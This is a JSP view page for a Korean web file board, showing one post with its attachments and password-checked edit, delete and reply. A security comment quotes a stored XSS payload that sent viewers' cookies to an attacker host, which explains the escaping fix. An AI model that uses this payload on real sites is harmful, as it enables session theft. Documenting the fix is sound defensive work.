
<%@page import="java.net.URLEncoder"%>
<%@page import="Vo.FileBoardVo"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>

<%
	request.setCharacterEncoding("UTF-8");
	String contextPath = request.getContextPath();

	//조회한 글정보 얻기
	FileBoardVo vo = (FileBoardVo)request.getAttribute("vo");

	/*
	 [버그 수정] 존재하지 않는 글번호 요청 방어

	   지금은 FileBoardService.serviceBoardRead() 가 없는 글이면
	   NotFoundException 을 던져 이 화면에 오기 전에 404 로 걸러지지만,
	   board/read.jsp 도 같은 이유로 이 검사를 한 번 더 두고 있다(다중 방어).
	   나중에 누군가 이 화면을 다른 경로로 직접 forward 하게 고치더라도
	   vo.getB_name() 에서 NullPointerException 이 나 500 에러가 되는 대신
	   여기서 먼저 안전하게 안내할 수 있다.
	*/
	if(vo == null){
%>
		<script>
			alert("존재하지 않는 게시글입니다.");   // 없는 글이라고 알린다
			location.href = "<%=contextPath%>/FileBoard/list.bo";   // 글 목록으로 되돌려 보낸다
		</script>
<%
		return;
	}

	/*
	 [보안 수정] 저장형 XSS 차단 - 출력 전에 HTML 특수문자를 무해하게 바꾼다.

	   글 제목에 아래를 저장하면 그 글을 열어본 모든 사람의 세션 쿠키가 유출됐다.
	       "><script>location.href='http://공격자/?c='+document.cookie</script>

	   변수에 담는 순간 이스케이프하면 아래 출력 지점을 하나도 빠뜨리지 않는다.

	 [버그 수정] 줄바꿈 처리
	   기존 : .replace("/r/n", "<br>")  <- 자바의 줄바꿈은 "\r\n" 인데 슬래시로 적어 동작하지 않았다.
	   내용은 <textarea> 안에 출력되고 textarea는 줄바꿈을 그대로 표시하므로 이스케이프만 한다.
	*/
	String name = util.HtmlUtil.escape(vo.getB_name());//조회한 글을 작성한 사람
	String email = util.HtmlUtil.escape(vo.getB_email());//조회한 글을 작성한 사람의 이메일
	String title = util.HtmlUtil.escape(vo.getB_title());//조회한 글제목
	String content = util.HtmlUtil.escape(vo.getB_content());//조회한 글 내용

	// 다중 파일 지원: sfile/ofile은 ';' 구분자로 연결된 파일명 목록
	String[] sfileArr = vo.getSfileList(); // 저장 파일명 배열
	String[] ofileArr = vo.getOfileList(); // 원본 파일명 배열
	int downCount = vo.getDowncount(); //업로드한 파일을 실제 다운로드한 횟수

	String b_idx = (String)request.getAttribute("b_idx");
	String nowPage = (String)request.getAttribute("nowPage");
	String nowBlock = (String)request.getAttribute("nowBlock");


	String id = (String)session.getAttribute("id");
	if(id == null){//로그인 하지 않았을 경우 , 글 수정, 삭제  , 답변달기 하지 못하도록
%>
		<script>
			alert("로그인 하셔야 합니다.");   // 로그인이 필요하다고 알린다
			history.back();   // 이전 화면으로 되돌린다
		</script>
<%
		/*
		 [보안 수정] return; 누락 - 경고창만 띄우고 아래 글 내용이 계속 만들어지고 있었다.

		   board/read.jsp, board/reply.jsp, board/fileboardreply.jsp 에서 이미
		   고쳤던 것과 완전히 같은 문제가 이 화면에는 아직 남아 있었다.
		   경고창은 떴지만 글 내용은 이미 응답에 모두 담겨 있어서
		     - 브라우저에서 "페이지 소스 보기"를 하면 제목·내용·첨부파일
		       다운로드 링크까지 그대로 보였다
		     - 자바스크립트를 끄면 경고창도 뜨지 않고 그냥 읽혔다
		   지금은 return; 으로 응답 생성을 즉시 중단해, 비로그인 상태에서는
		   아래 글 내용이 아예 만들어지지 않는다.
		*/
		return;
	}

%>

<%--
 ============================================================================
  board/fileboardread.jsp  -  자료실(파일게시판) 글 상세 화면 (로그인한 회원만 볼 수 있다)

  CarMain.jsp 의 가운데 영역에 끼워져(include) 보이는 화면 조각이다.
    요청 흐름 : fileboardlist.jsp 글 제목 클릭 -> /FileBoard/read.bo
               -> 사장(FileBoardController) -> 조회한 글 정보(vo)를 request 에
               담아 -> 이 화면

  구조는 board/read.jsp 와 거의 같고, 다른 점 두 가지뿐이다.
    1) 첨부파일 목록과 다운로드 링크가 있다 (아래 "첨부파일" 항목)
    2) 댓글 대신 [답변달기] 버튼으로 계층형 답글을 쓴다 (공지 게시판은
       "관리자 답변"이 하나의 문서로 남는 편이 자연스러워 board/read.jsp 처럼
       댓글로 바꾸지 않고 답변 방식을 그대로 두었다)
 ============================================================================
--%>
	<div class="board-container">

		<h2 class="section-title">파일 게시판</h2>

		<dl class="detail-list">

			<div class="detail-row">
				<dt>작성자</dt>
				<dd><input class="form-control" type="text" name="writer" id="writer" value="<%=name%>" disabled></dd>
			</div>

			<div class="detail-row">
				<dt>이메일</dt>
				<dd><input class="form-control" type="email" name="email" id="email" value="<%=email%>" disabled></dd>
			</div>

			<div class="detail-row">
				<dt>제목</dt>
				<dd><input class="form-control" type="text" name="title" id="title" value="<%=title%>" disabled></dd>
			</div>

			<div class="detail-row">
				<dt>첨부파일</dt>
				<dd>
<%
	//첨부파일이 있으면 파일명 목록을 링크로 보여준다
	if(sfileArr != null && sfileArr.length > 0) {

		for(int fi = 0; fi < sfileArr.length; fi++) {

			String sf = sfileArr[fi];
			if(sf == null || sf.trim().isEmpty()) { continue; }

			/* 화면에 보여줄 이름은 원본 파일명(ofile), 서버에 보낼 이름은 저장명(sfile)이다.
			   디스크에는 UUID 이름으로 저장되어 있으므로 둘을 구분해서 쓴다. */
			String of = (ofileArr != null && fi < ofileArr.length && ofileArr[fi] != null
						 && !ofileArr[fi].trim().isEmpty()) ? ofileArr[fi].trim() : sf.trim();
%>
					<%-- attach-link : 손가락으로 누를 수 있도록 CSS 가 높이 44px 를 보장한다.
					     첨부 다운로드는 이 화면에서 가장 많이 누르는 대상이다. --%>
					<div class="mb-2">
						&#128206;
						<a class="attach-link" href="<%=contextPath%>/FileBoard/Download.do?path=<%=b_idx%>&fileName=<%=URLEncoder.encode(sf.trim(), "UTF-8")%>"><%=util.HtmlUtil.escape(of)%></a>
					</div>
<%
		}//for

	}else{
%>
					<span class="text-muted fs-sm">첨부파일 없음</span>
<%
	}
%>
					<p class="form-hint">다운로드 수 : <%=downCount%>회</p>
				</dd>
			</div>

			<div class="detail-row">
				<dt>내용</dt>
				<dd><textarea class="form-control" name="content" id="content" disabled><%=content%></textarea></dd>
			</div>

			<div class="detail-row">
				<dt>비밀번호</dt>
				<dd>
					<input class="form-control" type="password" name="pass" id="pass"
						   placeholder="글 작성 시 입력한 비밀번호">
					<p id="pwInput" class="form-hint"></p>
				</dd>
			</div>

		</dl>

		<%-- 버튼 : [수정][삭제] 는 비밀번호가 맞을 때만 보인다 (자바스크립트가 visibility 를 켠다) --%>
		<div class="flex flex-wrap gap-2 justify-between mt-6">

			<div class="flex flex-wrap gap-2">
				<button type="button" id="update" class="btn btn-primary" style="visibility:hidden;">수정</button>

				<button type="button" id="delete" class="btn btn-danger" style="visibility:hidden;"
						onclick="deletePro('<%=b_idx%>');">삭제</button>

				<button type="button" id="reply" class="btn btn-secondary">답변달기</button>
			</div>

			<button type="button" id="list" class="btn btn-ghost"
					onclick="location.href='<%=contextPath%>/FileBoard/list.bo?nowBlock=<%=nowBlock%>&nowPage=<%=nowPage%>'">
				목록
			</button>

		</div>

	</div>
	<%-- board-container 끝 --%>

	<%-- 답변 버튼을 클릭했을때 답변을 작성할수 있는 화면 요청! --%>
	<form id="replyForm"  action="<%=contextPath%>/FileBoard/reply.do">

		<%--주글 의 글번호 전달 --%>
		<input type="hidden" name="b_idx"
							 value="<%=b_idx%>"
							 id="b_idx">
		<%--답변글을 작성하는 사람의 로그인된 아이디를 전달--%>
		<input type="hidden" name="id" value="<%=id%>">

	</form>

	<script>
		//컨텍스트 경로
		var ctx = "<%=contextPath%>";

		//수정 입력칸 3개 (한꺼번에 켜고 끄기 위해 묶어둔다)
		var EDIT_FIELDS = ["email", "title", "content"];

		// ============================================================
		// 0. 본문 높이를 내용에 맞춘다
		// ============================================================
		/*
		  [왜 필요한가]

		    본문은 <textarea> 로 보여준다. 읽기 화면이니 <div> 로 그려도 될 것 같지만,
		    비밀번호가 맞으면 이 칸의 disabled 를 풀어 그 자리에서 수정하기 때문에
		    textarea 구조를 유지해야 한다. (EDIT_FIELDS 에 content 가 들어있다)

		    문제는 CSS 가 min-height: 160px 이라 긴 글은 대부분 잘려 보인다는 것이다.
		    글을 읽으려고 들어온 사람이 작은 칸 안에서 스크롤을 해야 한다.

		    그래서 열릴 때 내용 높이(scrollHeight)만큼 늘려준다.
		    수정하면서 줄이 늘어날 때도 다시 맞춰야 하므로 input 이벤트에도 연결한다.

		    ※ CSS 의 field-sizing: content 로도 되지만 지원 브라우저가 아직 좁아
		       모든 환경에서 같게 동작하도록 자바스크립트로 처리한다.
		*/
		function fitContentHeight(){

			var ta = document.getElementById("content");   // 내용이 들어 있는 textarea 를 찾는다
			if(!ta){ return; }   // 그 칸이 없는 화면이면 아무것도 하지 않는다

			//일단 최소 높이로 되돌려야 scrollHeight 가 실제 내용 높이로 계산된다
			ta.style.height = "auto";

			//테두리 때문에 1~2px 이 모자라 스크롤바가 생기는 것을 막는다
			ta.style.height = (ta.scrollHeight + 4) + "px";
		}

		//첨부파일 목록·글꼴이 모두 적용된 뒤에 재야 정확하다
		if(document.readyState === "loading"){
			document.addEventListener("DOMContentLoaded", fitContentHeight);
		}else{
			fitContentHeight();   // 이미 다 읽혔으면 바로 실행한다
		}

		//수정 중 줄이 늘어나면 따라 늘어나게
		(function(){
			var ta = document.getElementById("content");   // 내용이 들어 있는 textarea 를 찾는다
			if(ta){ ta.addEventListener("input", fitContentHeight); }   // 글자를 칠 때마다 높이를 다시 맞춘다 (스크롤 없이 전부 보이게)
		})();   // 이 괄호가 위에서 시작한 함수를 "바로 실행" 시킨다

		// ============================================================
		// 1. [답변달기] 버튼 -> 답변글 작성 화면 요청
		// ============================================================
		document.getElementById("reply").addEventListener("click", function(){
			document.getElementById("replyForm").submit();   // 숨어 있는 답글 폼을 대신 제출해 답글 쓰기 화면으로 간다
		});

		// ============================================================
		// 2. 글 삭제
		// ============================================================
		function deletePro(b_idx){

			if(!window.confirm("정말로 글을 삭제하시겠어요?")){   // 확인창에서 "취소" 를 누르면
				return false;   // 아무것도 하지 않고 끝낸다
			}

			/* [보안] 글 비밀번호를 함께 보낸다 (서버가 다시 검증한다) */
			CarApp.postForm(ctx + "/FileBoard/deleteBoard.do", {
				b_idx : b_idx,   // 어느 글을 지울지
				pass  : CarApp.val("pass")
			}).then(function(data){

				if(data === "삭제성공"){   // 서버가 "삭제성공" 이라고 답했으면

					alert("삭제성공");   // 성공을 알린다
					CarApp.setDisabled(EDIT_FIELDS, true);   // 입력칸들을 잠근다 (지워진 글을 더 고칠 수 없게)

					//2초 뒤 [목록] 버튼을 눌러 글목록으로 이동
					setTimeout(function(){
						document.getElementById("list").click();   // 숨어 있는 [목록] 버튼을 대신 눌러 목록 화면으로 보낸다
					}, 2000);   // 2000밀리초 = 2초 뒤에 실행한다 (알림을 읽을 시간을 준다)

				}else if(data === "비밀번호틀림"){   // 서버가 "비밀번호틀림" 이라고 답했으면
					CarApp.setText("pwInput", "글 비밀번호가 일치하지 않습니다.", "red");   // 비밀번호가 다르다고 빨간 글씨로 안내한다

				}else{
					CarApp.setText("pwInput", "삭제실패!", "red");   // 그 밖의 실패면 실패했다고만 알린다
					CarApp.setDisabled(EDIT_FIELDS, false);   // 입력칸을 다시 열어 준다
				}

			}).catch(function(err){   // 통신 자체가 실패한 경우
				alert("삭제 요청 실패 : " + err.message);   // 실패 이유를 알린다
			});
		}

		// ============================================================
		// 3. 글 수정
		// ============================================================
		document.getElementById("update").addEventListener("click", function(){

			CarApp.postForm(ctx + "/FileBoard/updateBoard.do", {   // 공지 수정 주소로 값을 보낸다
				email   : CarApp.val("email"),   // 수정한 이메일
				title   : CarApp.val("title"),
				content : CarApp.val("content"),
				idx     : CarApp.val("b_idx"),
				pass    : CarApp.val("pass")   //[보안] 서버에서 다시 검증
			}).then(function(data){

				if(data === "수정성공"){   // 서버가 "수정성공" 이라고 답했으면
					CarApp.setHtml("pwInput", "<strong>수정성공</strong>", "green");   // 성공을 초록 글씨로 안내한다
					CarApp.setDisabled(EDIT_FIELDS, true);   // 입력칸들을 잠근다

				}else if(data === "비밀번호틀림"){   // 서버가 "비밀번호틀림" 이라고 답했으면
					CarApp.setHtml("pwInput", "<strong>글 비밀번호가 일치하지 않습니다.</strong>", "red");   // 비밀번호가 다르다고 빨간 글씨로 안내한다

				}else{
					CarApp.setHtml("pwInput", "<strong>수정 실패</strong>", "red");   // 그 밖의 실패면 실패했다고만 알린다
					CarApp.setDisabled(EDIT_FIELDS, false);   // 입력칸을 다시 열어 준다
				}

			}).catch(function(err){   // 통신 자체가 실패한 경우
				alert("수정 요청 실패 : " + err.message);   // 실패 이유를 알린다
			});
		});

		// ============================================================
		// 4. 글 비밀번호 확인 (입력칸을 벗어났을 때)
		//    [중요] 화면의 버튼 활성화는 편의 기능이다.
		//           실제 권한 검사는 서버(FileBoardService)가 수정/삭제 시점에 한다.
		// ============================================================
		document.getElementById("pass").addEventListener("focusout", function(){

			var pass = CarApp.val("pass");   // 입력한 글 비밀번호를 읽는다
			if(pass === ""){ return; }   // 빈 값으로는 서버를 부르지 않는다 (불필요한 요청 방지)

			CarApp.postForm(ctx + "/FileBoard/password.do", {   // 비밀번호 확인 주소로 보낸다
				b_idx : CarApp.val("b_idx"),   // 어느 글의 비밀번호인지
				pass  : pass
			}).then(function(data){

				var ok = (data === "비밀번호 맞음");   // 서버는 "비밀번호 맞음" 또는 "비밀번호 틀림" 을 보낸다

				CarApp.setText("pwInput",   // 결과를 안내 문구로 띄운다
					ok ? "글의 비밀번호가 일치합니다." : "글의 비밀번호가 다릅니다",
					ok ? "green" : "red");

				CarApp.setDisabled(EDIT_FIELDS, !ok);   // 맞으면 입력칸을 열고, 틀리면 잠근다
				CarApp.setVisible(["update", "delete"], ok);   // 맞을 때만 수정·삭제 버튼을 보여 준다

			}).catch(function(err){   // 통신 자체가 실패한 경우
				alert("비밀번호 확인 실패 : " + err.message);   // 실패 이유를 알린다
			});
		});
	</script>
